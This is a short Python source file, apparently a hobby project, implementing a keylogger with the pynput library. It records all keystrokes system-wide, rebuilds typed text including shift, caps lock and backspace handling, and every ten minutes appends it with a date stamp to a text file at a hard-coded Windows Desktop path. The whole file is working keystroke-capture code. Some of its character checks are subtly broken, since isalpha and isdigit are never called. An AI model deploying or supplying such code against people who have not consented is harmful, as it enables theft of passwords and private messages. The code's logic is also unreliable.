import pynput
from pynput.keyboard import Key, Listener
import datetime
import string
import sys
import time

count, keys = 0, []
date = datetime.datetime.today()
words = ''
start_time_words, start_time_list = time.time(), time.time()
written = False


def key_pressed(key):
    keys.append(key)


def key_released(key):
    global start_time_words, start_time_list
    curr_time = time.time()

    if curr_time - start_time_words >= 30:
        generate_sentence()
        start_time_words = time.time()

    if curr_time - start_time_list >= 600:
        write_file()
        start_time_list = time.time()

    if key == Key.esc:  # mainly for debugging purposes, to stop the program
        if not written:
            generate_sentence()
            write_file()
        sys.exit()


def generate_sentence():
    global keys, written, words
    swap_case, shift_pressed, num_spaces = 0, False, 0
    for key in keys:
        if shift_pressed:
            swap_case = 0
            shift_pressed = False
        if key == Key.space:
            num_spaces += 1
            if num_spaces % 12 == 0:
                words += '\n'
            else:
                words += ' '
        elif key == Key.backspace:
            words = words[:-1]
        elif key == Key.enter:
            words += '\n'
        elif key == Key.shift:
            swap_case = 1
            shift_pressed = True
        elif key == Key.caps_lock:
            swap_case = 0 if swap_case else 1
        if str(key).find("Key") == -1:
            if str(key).startswith(r'\x'):
                continue
            elif str(key).isalpha:
                if swap_case:
                    words += str(key).replace("'", "").swapcase()
                else:
                    words += str(key).replace("'", "")
            elif str(key).isdigit or str(key) in string.punctuation:
                words += str(key).replace("'", "")
    keys = []
    written = False


def write_file():
    global words, written
    with open(r"C:\Users\akush\Desktop\Programming\Projects\Keylogger\keys_logged.txt", 'a') as fhand:
        fhand.write("DATE: {}\n".format(date))
        fhand.write(words)
        fhand.write('\n')
        fhand.write('-'*79)
        fhand.write('\n')
    words = ''
    written = True


with Listener(on_press=key_pressed, on_release=key_released) as listener:
    listener.join()
